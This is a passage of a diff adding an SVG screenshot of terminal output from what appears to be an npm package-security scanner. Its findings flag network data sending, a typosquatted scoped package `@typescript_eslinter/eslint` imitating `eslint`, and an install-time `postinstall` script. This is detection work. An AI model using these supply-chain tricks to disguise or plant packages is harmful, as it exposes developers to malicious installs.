+</text><text class="terminal-1572737541-r4" x="427" y="849.6" textLength="744.2" clip-path="url(#terminal-1572737541-line-34)">data&#160;sent&#160;over&#160;the&#160;network&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="849.6" textLength="12.2" clip-path="url(#terminal-1572737541-line-34)">
+</text><text class="terminal-1572737541-r12" x="0" y="874" textLength="109.8" clip-path="url(#terminal-1572737541-line-35)">medium&#160;&#160;&#160;</text><text class="terminal-1572737541-r1" x="134.2" y="874" textLength="268.4" clip-path="url(#terminal-1572737541-line-35)">TYPOSQUAT&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="427" y="874" textLength="744.2" clip-path="url(#terminal-1572737541-line-35)">`@typescript_eslinter/eslint`&#160;resembles&#160;`eslint`&#160;(#104&#160;most&#160;&#160;</text><text class="terminal-1572737541-r5" x="1195.6" y="874" textLength="244" clip-path="url(#terminal-1572737541-line-35)">(package)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="874" textLength="12.2" clip-path="url(#terminal-1572737541-line-35)">
+</text><text class="terminal-1572737541-r4" x="427" y="898.4" textLength="744.2" clip-path="url(#terminal-1572737541-line-36)">downloaded&#160;on&#160;npm)&#160;via&#160;unofficial&#160;scope&#160;@typescript_eslinter&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="898.4" textLength="12.2" clip-path="url(#terminal-1572737541-line-36)">
+</text><text class="terminal-1572737541-r4" x="427" y="922.8" textLength="744.2" clip-path="url(#terminal-1572737541-line-37)">on&#160;a&#160;popular&#160;unscoped&#160;name&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="922.8" textLength="12.2" clip-path="url(#terminal-1572737541-line-37)">
+</text><text class="terminal-1572737541-r12" x="0" y="947.2" textLength="109.8" clip-path="url(#terminal-1572737541-line-38)">medium&#160;&#160;&#160;</text><text class="terminal-1572737541-r1" x="134.2" y="947.2" textLength="268.4" clip-path="url(#terminal-1572737541-line-38)">NPM-INSTALL-SCRIPT&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="427" y="947.2" textLength="366" clip-path="url(#terminal-1572737541-line-38)">`postinstall`:&#160;node&#160;install.js</text><text class="terminal-1572737541-r9" x="793" y="947.2" textLength="195.2" clip-path="url(#terminal-1572737541-line-38)">&#160;&#160;[install-time]</text><text class="terminal-1572737541-r5" x="1195.6" y="947.2" textLength="244" clip-path="url(#terminal-1572737541-line-38)">package.json:6&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="947.2" textLength="12.2" clip-path="url(#terminal-1572737541-line-38)">
+</text><text class="terminal-1572737541-r4" x="1439.6" y="971.6" textLength="12.2" clip-path="url(#terminal-1572737541-line-39)">
+</text>
+    </g>
+    </g>
+</svg>
